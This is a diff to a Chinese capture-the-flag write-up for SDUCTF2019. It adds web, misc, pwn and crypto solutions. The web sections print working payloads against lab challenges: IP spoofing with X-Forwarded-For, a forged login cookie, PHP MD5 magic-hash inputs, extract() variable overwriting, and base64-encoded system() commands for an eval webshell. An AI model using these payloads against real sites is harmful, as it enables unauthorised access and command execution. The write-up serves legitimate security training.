@@ -23,6 +23,8 @@ PS.刚准备写wp又放出来一题QAQ
 
 ！！！写wp一半又放出题目
 
+说好的周六早上放题的，结果早上起来一脸懵逼
+
 
 
 ## <center>Web</center>
@@ -223,7 +225,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 
 进入页面是个小游戏，发现是hackergame2019原题嘤嘤嘤
 
-### 原题wp： [https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E8%BE%BE%E6%8B%89%E5%B4%A9%E5%90%A7%E5%A4%A7%E5%86%92%E9%99%A9/README.md](https://github.com/ustclug/hackergame2019-writeups/blob/master/official/达拉崩吧大冒险/README.md) 
+原题wp： [https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E8%BE%BE%E6%8B%89%E5%B4%A9%E5%90%A7%E5%A4%A7%E5%86%92%E9%99%A9/README.md](https://github.com/ustclug/hackergame2019-writeups/blob/master/official/达拉崩吧大冒险/README.md) 
 
 不过在买菜这里，有一个大整数溢出，后续会搞懂这个原理
 
@@ -238,6 +240,257 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 然后得到flag
 
 ![](SDUCTF2019-wp\web12-4.jpg)
+
+
+
+### 0x0d HTTP头
+
+> 题目描述： 你了解http头吗？ 
+
+![](SDUCTF2019-wp\web13.jpg)
+
+根据题目，直接查看http Response Headers
+
+得到flag：`F1ag: flag{096b5778-cf23-4f03-8c45-2505b7670b89}`
+
+
+
+
+
+### 0x0e robots
+
+> 题目描述： 你听说过robots协议吗？
+> 他可是每个机器人都需要遵守的协议啊！（笑话） 
+
+由题目知，robots是一个限制爬虫的东西，直接访问`url/robots.txt`
+
+```
+User-agent: *
+Disallow: /
+Disallow: f1ag_1s_h3re.php
+```
+
+得到如上页面，访问`url/f1ag_1s_h3re.php`，得到flag
+
+
+
+
+
+### 0x0f 你的IP不太对
+
+> 题目描述：小伙计，你的IP不太对啊
+> 这个网站可不是任何ip都能访问的
+
+由题目可知，需要改ip成`111.111.111.111`访问，易知是XFF伪造
+
+利用burpsuite抓包，在header里加上`X-Forwarded-For:111.111.111.111`即可，发送包，得到flag
+
+
+
+
+
+### 0x10 登录
+
+> 题目描述： 小王做了一个网站需要登录，但是验证貌似有点漏洞 
+
+进入页面之后发现button是没有用的，F5刷新之后抓包，发现有一个cookie
+
+
+
+![](SDUCTF2019-wp\web17-1.jpg)
+
+尝试将Cookie改成`Cookie: Login=1`，发现成功得到flag在button上
+
+![](SDUCTF2019-wp\web17-2.jpg)
+
+
+
+### 0x11 破解md5
+
+> 题目描述： md5是坚不可破的，是真的吗？ 
+
+![](SDUCTF2019-wp\web18-1.jpg)
+
+进入页面之后直接查看源码，如题直接百度搜索php MD5漏洞。
+
+> 引自： https://blog.csdn.net/qq_19980431/article/details/83018232 
+
+```php
+<!-- 
+    if (isset($_GET['a']) and isset($_GET['b'])) {
+    if ($_GET['a'] != $_GET['b'])
+    if (md5($_GET['a']) == md5($_GET['b']))
+    die('Flag: '.$flag);
+    else
+    print 'Wrong.';
+}
+ -->
+```
+
+
+
+若要求满足上述条件则
+那么要求name和password数值不同但是MD5相同，在这里可以利用绕过。
+PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。 
+
+> **以下值在md5加密后以0E开头：**
+>
+> - QNKCDZO
+> - 240610708
+> - s878926199a
+> - s155964671a
+> - s214587387a
+> - s214587387a
+>
+> **以下值在sha1加密后以0E开头：**
+>
+> - sha1(‘aaroZmOk’)
+> - sha1(‘aaK1STfY’)
+> - sha1(‘aaO8zKZF’)
+> - sha1(‘aa3OFF9m’)
+
+直接传入`url/?a=QNKCDZO&b=240610708`，得到flag
+
+
+
+
+
+### 0x12 php是最好的语言
+
+> 题目描述： php是最好的语言? 
+
+![](SDUCTF2019-wp\web19.jpg)
+
+进入页面如上图，点击查看source.php
+
+![](SDUCTF2019-wp\web19-2.jpg)
+
+```php
+<?php if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $flag="flag{this_is_flag}";
+    $pass="";
+    $thepassword_123="不告诉你";
+    extract($_POST);
+}
+?>
+
+<div>
+    <p><?php if ($pass == $thepassword_123) { echo $flag;} else {echo "ha,你永远猜不到";} ?></p>
+</div>
+
+```
+
+得到php源码，百度php extract函数，得知`extract()`有个变量覆盖漏洞
+
+由php源码得知所有变量名，直接出入post参数`pass=&thepassword_123=`
+
+得到flag
+
+![](SDUCTF2019-wp\web19-3.jpg)
+
+
+
+
+
+
+
+### 0x13 一句话木马2
+
+> 题目描述： 在现实世界中，最原始的一句话木马往往会被waf给拦截，所以在使用过程中一般会进行编码或者加密。
+> 这里使用最简单的编码，你能成功利用这个后门吗？ 
+
+进入网页查看源码
+
+![](SDUCTF2019-wp\web20.jpg)
+
+百度得知waf是` Web Application Firewall `的简称。
+
+这题应该是要绕过waf，进行获取webshell
+
+由`<!--php @eval(@base64_decode($_POST["cmd"])); -->`和题目shell.php得知：实在shell.php执行一句话木马
+
+```
+
+system('ls');
+base64>>>c3lzdGVtKCdscycpOw==
+system('cat ffffllllaaaagggg')
+base64>>>c3lzdGVtKCdjYXQgZmZmZmxsbGxhYWFhZ2dnZycpOw==
+
+```
+
+
+
+注：别在网页中解base64，不同网页也许会将字符串先url编码或者Unicode编码在进行base64加密，直接用burpsuite带的base64encode，然后发包即可
+
+![](SDUCTF2019-wp\web20-1.jpg)
+
+得知flag在同目录下的ffffllllaaaagggg里
+
+![](SDUCTF2019-wp\web20-2.jpg)
+
+得到flag
+
+
+
+### 0x14 拼手速
+
+> 题目描述： 你就是个没有感情的浏览器，但是你的手速够快吗？ 
+
+进入页面
+
+![](SDUCTF2019-wp\web21.jpg)
+
+如题，提交get请求`url/?first=cyber`
+
+![](SDUCTF2019-wp\web21-2.jpg)
+
+如题，提交post请求`sceond=ans`（因为计算式每次都会变，所以我这用ans替代，不过也没关系，得到如下页面
+
+![](SDUCTF2019-wp\web21-3.jpg)
+
+因为每次刷新get页面是计算式都会变，所以我想到了用python的requests的库，脚本如下
+
+```python
+import requests
+import re
+
+url = "http://url/?first=cyber"
+reflag = '\d\*\d\+\d\*\d'
+
+def qa():
+	r1 = requests.get(url)
+	print(r1.text)
+	r2 = re.search(reflag,r1.text)
+	print(r2.group())
+	ans = eval(r2.group())
+	print(ans)
+	ck = str(r1.cookies)
+	pd = re.search('PHPSESSID=.* for',ck)
+	pd = pd.group().split(' for')[0]
+	print(pd)
+	header = {
+	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0",
+	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+	"Cookie":pd,
+	"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+	"Accept-Encoding": "gzip, deflate"
+	}
+	data = {"second":ans}
+	print(header)
+	r4 =requests.post(url,headers=header,data=data)
+	print(r4)
+	print(r4.text)#flag
+	return r4
+	
+aa = qa()
+#print(aa)
+```
+
+
+
+跑出来结果如下，得到flag
+
+![](SDUCTF2019-wp\web21-4.jpg)
 
 
 
@@ -303,6 +556,42 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 
 
 
+### 0x05 二进制
+
+>  题目描述：看二进制你能看出个什么花样来？ 
+
+原本没有思路的，将文件扔进binwalk和foremost跑没跑出东西，用`less`，`more`没跑出来，最后自暴自弃用`cat`一试，flag就出来了，我还以为有什么隐写emmmmmmmmmm
+
+结果是一堆0加上flag
+
+另一种办法，用010editor打开，直接搜索flag，得到flag
+
+![](SDUCTF2019-wp\misc5.jpg)
+
+
+
+
+
+
+
+### 0x06 奇怪的压缩文件
+
+> 题目描述： eva说她给tom发了一张二维码，但是Tom接收文件后觉得不太对劲。 
+
+打开附件PIC.zip，发现里面有四个压缩文件，发现解压不了。扔binwalk跑一波发现是jpeg，直接改后缀得到jpg图片。
+
+四个压缩文件分别是QRcode四等分，用画图把他们拼一起，获得一张完整的二维码，扫码得到flag。
+
+![](SDUCTF2019-wp\misc6.jpg)
+
+
+
+
+
+
+
+
+
 ## <center>PWN</center>
 
 
@@ -319,6 +608,27 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 虽然pwn还没入门，不过这确实是最简单得pwn。
 
 熟悉nc即netcat命令即可，`netcat ctf.sec.sdunet.cn 38849`直接连上通过`ls,cat`命令读取flag
+
+
+
+### 0x02 猜拳
+
+> 题目描述： 猜拳，你能赢过机器人吗？ 
+
+又是没有思路的pwn，上网搜索得知python有个pwn库可以计算随机数种子，既然是猜，我就自己找一波规律。
+
+![](SDUCTF2019-wp\pwn2-sjb.jpg)
+
+```
+robot: 		bsj sjb jbs
+I can win: 	jbs bsj sjb
+```
+
+找规律得知对面出拳是一个循环，自己手动解一波得到flag
+
+
+
+
 
 
 
@@ -393,6 +703,67 @@ ans = hashlib.md5(str(s+mobj).encode('utf-8')).hexdigest()
 
 
 
+### 0x04 键盘追踪
+
+> 题目描述：键盘是个画板，如果你的键盘有灯光应该会简单点
+>
+> rfsdsz tfvbhy ijnm ijnm tfvbhy wsxdcft vgyhujm hjuygbn
+>
+> 还原出明文后请自行拼接flag{}
+
+之前在成都大学的ctf比赛中看过键盘密码，看题目描述应该是按键盘位置画出字母来，但是我比划出`olloWMe`后七个字母，硬是没看懂第一个字符是啥，然后将那些字符扔去百度，搜索得到的时`FollowMe`，尝试一波，果然是flag。
+
+（至今为止我都不知道第一个为啥时F
+
+
+
+
+
+### 0x05 宇宙终极问题
+
+> 题目描述：Do you know The Answer to the Ultimate Question of Life, The Universe, and Everything?
+>
+> Give me 3 integers, x, y, and z, such that **x^3 + y^3 + z^3 = 42**
+>
+> 得到x、y、z后请把它们乘起来，然后包裹上flag{}
+
+直接百度得到解如下，扔进python跑一波大数乘法
+
+```python
+>>> x = -80538738812075974
+>>> y = 80435758145817515
+>>> z = 12602123297335631
+>>> x**3+y**3+z**3
+42
+>>> x*y*z
+-81639006040518590050493906720365515701570561538910
+```
+
+
+
+
+
+### 0x06 秘密报文
+
+> 题目描述：在第一次世界大战期间，法国陆军捕获到一份秘密报文，交给中尉Georges Painvin尝试破解。
+>
+> 报文内容如下：
+> XX DF GG AF XD XF AF XD XF AF AG DD AF GF DX XF XD
+>
+> 解密之后请自行拼接flag{}提交
+
+我记得之前做题时有看见过类似密码，但是忘了是啥。
+
+最明显的，先把中尉名字`Georges Painvin`百度一波，得知时`ADFGVX密码`对照密码表，解得flag：`flag{youarearealhacker}`
+
+![图源自百度百科](SDUCTF2019-wp\crypto6.jpg)
+
+
+
+
+
+
+
 ## <center>Mobile</center>
 
 
@@ -437,7 +808,7 @@ ans = hashlib.md5(str(s+mobj).encode('utf-8')).hexdigest()
 
 
 
-0x02
+### 0x02 C#
 
 > 题目描述： C#简直跟java一样，会java就自然上手c#了。 
 
@@ -451,7 +822,7 @@ ans = hashlib.md5(str(s+mobj).encode('utf-8')).hexdigest()
 
 
 
-0x03 Rust
+### 0x03 Rust
 
 > 题目描述： 你听说过Rust语言吗？
 > 					据说它非常安全。 
@@ -493,6 +864,22 @@ ans = hashlib.md5(str(s+mobj).encode('utf-8')).hexdigest()
 
 
 ![](SDUCTF2019-wp\re3-rust-5.jpg)
+
+
+
+
+
+
+
+
+
+
+
+# TODO List
+
+
+
+web：http头，robots，你的ip不太对(XFF)，登陆(Cookie:login=1)，破解MD5(php function fail)，php是最好的语言(extract()函数变量覆盖)，一句话木马2(cmd=c3lzdGVtKCdjYXQgZmZmZmxsbGxhYWFhZ2dnZycpOw==)，拼手速(python requests)
 
 
 
